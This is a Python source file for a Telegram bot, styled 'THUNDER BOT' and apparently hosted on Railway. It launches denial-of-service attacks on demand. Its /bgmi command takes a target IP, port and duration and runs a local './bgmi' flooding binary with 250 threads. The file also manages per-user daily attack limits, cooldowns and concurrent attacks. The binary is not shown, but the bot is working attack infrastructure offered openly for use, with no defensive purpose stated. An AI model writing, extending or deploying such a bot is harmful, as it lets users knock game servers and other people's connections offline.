import os
import telebot
import subprocess
import threading
from datetime import datetime, timedelta
from flask import Flask, request

# ========== CONFIGURATION ==========
TOKEN = os.environ.get("TOKEN")   # Railway variable
ADMIN_IDS = [1924991786, 5071105651]

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# Global variables
user_attacks = {}
user_cooldowns = {}
active_attacks = 0
attack_lock = threading.Lock()

# Config
thread_count = 250
COOLDOWN_DURATION = 30
DAILY_ATTACK_LIMIT = 50
MAX_ACTIVE_ATTACKS = 3
EXEMPTED_USERS = []

# ========== HELPERS ==========
def is_valid_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

# ========== COMMANDS ==========
@bot.message_handler(commands=['start'])
def send_welcome(message):
    username = message.from_user.username or message.from_user.first_name
    bot.reply_to(message, f"""
🚀 *THUNDER BOT ACTIVE* 🚀

Welcome @{username}

Commands:
/bgmi <IP> <PORT> <TIME>
/status
""", parse_mode="Markdown")

@bot.message_handler(commands=['status'])
def check_status(message):
    user_id = message.from_user.id
    remaining = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)

    bot.reply_to(message, f"""
📊 Status:
Remaining: {remaining}/{DAILY_ATTACK_LIMIT}
Active: {active_attacks}/{MAX_ACTIVE_ATTACKS}
""")

@bot.message_handler(commands=['bgmi'])
def bgmi_command(message):
    global active_attacks

    user_id = message.from_user.id

    if active_attacks >= MAX_ACTIVE_ATTACKS:
        bot.reply_to(message, "Server busy, wait...")
        return

    try:
        args = message.text.split()[1:]
        if len(args) != 3:
            bot.reply_to(message, "Usage: /bgmi ip port time")
            return

        ip, port, duration = args

        if not is_valid_ip(ip):
            bot.reply_to(message, "Invalid IP")
            return

        duration = int(duration)

        active_attacks += 1

        bot.reply_to(message, f"Attack started on {ip}:{port}")

        def run_attack():
            global active_attacks
            try:
                if not os.path.exists("./bgmi"):
                    bot.send_message(message.chat.id, "Binary missing")
                    return

                subprocess.run(
                    ["./bgmi", ip, port, str(duration), str(thread_count)],
                    timeout=duration + 5
                )

                bot.send_message(message.chat.id, "Attack finished")

            except Exception as e:
                bot.send_message(message.chat.id, f"Error: {e}")

            finally:
                active_attacks = max(0, active_attacks - 1)

        threading.Thread(target=run_attack).start()

    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

# ========== WEBHOOK ==========
@app.route(f"/{TOKEN}", methods=["POST"])
def webhook():
    update = telebot.types.Update.de_json(request.get_data().decode("utf-8"))
    bot.process_new_updates([update])
    return "ok", 200

@app.route("/")
def home():
    return "Bot running"

# ========== START ==========
if __name__ == "__main__":
    print("BOT STARTED")

    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)